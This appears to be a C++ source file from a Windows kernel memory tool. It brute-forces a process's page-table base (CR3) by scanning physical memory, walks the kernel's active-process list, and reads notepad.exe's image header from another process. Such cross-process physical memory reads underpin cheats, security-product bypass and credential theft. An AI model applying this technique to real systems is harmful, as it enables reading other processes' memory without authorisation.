#include <windows.h>
#include <stdio.h>
#include <thread>
#include <atomic>
#include <vector>
#include "symbols.h"
#include "window.h"
#include "reader.h"

static void ScanCr3Worker(
    ULONG64 startPage, ULONG64 endPage,
    ULONG64 targetVA, ULONG64 secondVA, ULONG64 totalPages,
    std::atomic<ULONG64>& foundCr3, std::atomic<bool>& found
) {
    ULONG64 pml4i = (targetVA >> 39) & 0x1FF;
    ULONG64 pdpti = (targetVA >> 30) & 0x1FF;
    ULONG64 pdi   = (targetVA >> 21) & 0x1FF;
    ULONG64 pti   = (targetVA >> 12) & 0x1FF;

    for (ULONG64 page = startPage; page < endPage; page++) {
        if (found.load(std::memory_order_acquire)) return;

        ULONG64 cr3 = page << 12;
        if (!cr3) continue;

        __try {
            ULONG64 pml4e = WindowRead64(cr3 + pml4i * 8);
            if (!(pml4e & 1)) continue;
            ULONG64 pfn1 = (pml4e >> 12) & 0xFFFFFFFFF;
            if (!pfn1 || pfn1 >= totalPages) continue;

            ULONG64 pdpte = WindowRead64((pfn1 << 12) + pdpti * 8);
            if (!(pdpte & 1)) continue;
            if (pdpte & 0x80) continue; // skip large pages for accuracy
            ULONG64 pfn2 = (pdpte >> 12) & 0xFFFFFFFFF;
            if (!pfn2 || pfn2 >= totalPages) continue;

            ULONG64 pde = WindowRead64((pfn2 << 12) + pdi * 8);
            if (!(pde & 1)) continue;
            if (pde & 0x80) continue;
            ULONG64 pfn3 = (pde >> 12) & 0xFFFFFFFFF;
            if (!pfn3 || pfn3 >= totalPages) continue;

            ULONG64 pte = WindowRead64((pfn3 << 12) + pti * 8);
            if (!(pte & 1)) continue;
            ULONG64 pfn4 = (pte >> 12) & 0xFFFFFFFFF;
            if (!pfn4 || pfn4 >= totalPages) continue;

            // verify with second VA
            if (secondVA) {
                ULONG64 i0 = (secondVA >> 39) & 0x1FF;
                ULONG64 i1 = (secondVA >> 30) & 0x1FF;
                ULONG64 i2 = (secondVA >> 21) & 0x1FF;
                ULONG64 i3 = (secondVA >> 12) & 0x1FF;

                ULONG64 e0 = WindowRead64(cr3 + i0 * 8);
                if (!(e0 & 1)) continue;
                ULONG64 p0 = (e0 >> 12) & 0xFFFFFFFFF;
                if (!p0 || p0 >= totalPages) continue;

                ULONG64 e1 = WindowRead64((p0 << 12) + i1 * 8);
                if (!(e1 & 1)) continue;
                if (!(e1 & 0x80)) {
                    ULONG64 p1 = (e1 >> 12) & 0xFFFFFFFFF;
                    if (!p1 || p1 >= totalPages) continue;
                    ULONG64 e2 = WindowRead64((p1 << 12) + i2 * 8);
                    if (!(e2 & 1)) continue;
                    if (!(e2 & 0x80)) {
                        ULONG64 p2 = (e2 >> 12) & 0xFFFFFFFFF;
                        if (!p2 || p2 >= totalPages) continue;
                        ULONG64 e3 = WindowRead64((p2 << 12) + i3 * 8);
                        if (!(e3 & 1)) continue;
                    }
                }
            }

            ULONG64 expected = 0;
            if (foundCr3.compare_exchange_strong(expected, cr3,
                std::memory_order_release, std::memory_order_relaxed)) {
                found.store(true, std::memory_order_release);
            }
            return;
        } __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
    }
}

static ULONG64 BruteForceCr3(ULONG64 targetVA, ULONG64 secondVA) {
    ULONGLONG installedKB = 0;
    GetPhysicallyInstalledSystemMemory(&installedKB);
    ULONG64 totalPages = (installedKB * 1024) >> 12;

    ULONG maxThreads = std::thread::hardware_concurrency();
    if (maxThreads < 1) maxThreads = 1;
    ULONG64 pagesPerThread = totalPages / maxThreads;

    std::atomic<ULONG64> foundCr3{0};
    std::atomic<bool> found{false};
    std::vector<std::thread> threads;

    printf("[*] Brute-forcing CR3 (%u threads, %llu pages)...\n", maxThreads, totalPages);

    for (ULONG i = 0; i < maxThreads; i++) {
        ULONG64 start = i * pagesPerThread;
        ULONG64 end = (i == maxThreads - 1) ? totalPages : (i + 1) * pagesPerThread;
        threads.emplace_back(ScanCr3Worker, start, end,
                             targetVA, secondVA, totalPages,
                             std::ref(foundCr3), std::ref(found));
    }

    for (auto& t : threads) t.join();
    return foundCr3.load();
}

void DemoReadProcess(ULONG64 systemCr3, KernelOffsets* offsets) {
    printf("\n[*] Demo: cross-process read\n");
    printf("[*] Looking for notepad.exe...\n");

    ULONG64 psActiveVA = offsets->NtoskrnlBase + offsets->PsActiveProcessHead;
    ULONG64 psActivePA = WindowVirtToPhys(systemCr3, psActiveVA);
    if (!psActivePA) return;

    ULONG64 listHead = psActiveVA;
    ULONG64 currentLink = WindowRead64(psActivePA);
    ULONG64 targetBase = 0;

    int count = 0;
    while (currentLink != listHead && currentLink != 0 && count < 500) {
        count++;
        ULONG64 eprocessVA = currentLink - offsets->ActiveProcessLinks;
        ULONG64 eprocessPA = WindowVirtToPhys(systemCr3, eprocessVA);

        if (eprocessPA) {
            char name[16] = {};
            WindowReadBuffer(eprocessPA + offsets->ImageFileName, name, 15);

            if (_stricmp(name, "notepad.exe") == 0) {
                targetBase = WindowRead64(eprocessPA + offsets->SectionBaseAddress);
                printf("[+] notepad.exe base: 0x%llX\n", targetBase);
                break;
            }
        }

        ULONG64 nextPA = WindowVirtToPhys(systemCr3, currentLink);
        if (!nextPA) break;
        currentLink = WindowRead64(nextPA);
    }

    if (!targetBase) {
        printf("[-] notepad.exe not found\n");
        return;
    }

    ULONG64 secondVA = (ULONG64)GetModuleHandleA("ntdll.dll");
    ULONG64 realCr3 = BruteForceCr3(targetBase, secondVA);
    if (!realCr3) {
        printf("[-] CR3 not found\n");
        return;
    }
    printf("[+] CR3: 0x%llX\n", realCr3);

    ULONG64 basePA = WindowVirtToPhys(realCr3, targetBase);
    if (!basePA) return;

    BYTE header[64] = {};
    WindowReadBuffer(basePA, header, 64);

    USHORT mz = *(USHORT*)header;
    printf("[+] Header: 0x%04X %s\n", mz, mz == 0x5A4D ? "(MZ)" : "");

    printf("[+] ");
    for (int i = 0; i < 64; i++) {
        printf("%02X ", header[i]);
        if ((i + 1) % 16 == 0) printf("\n    ");
    }
    printf("\n");
}
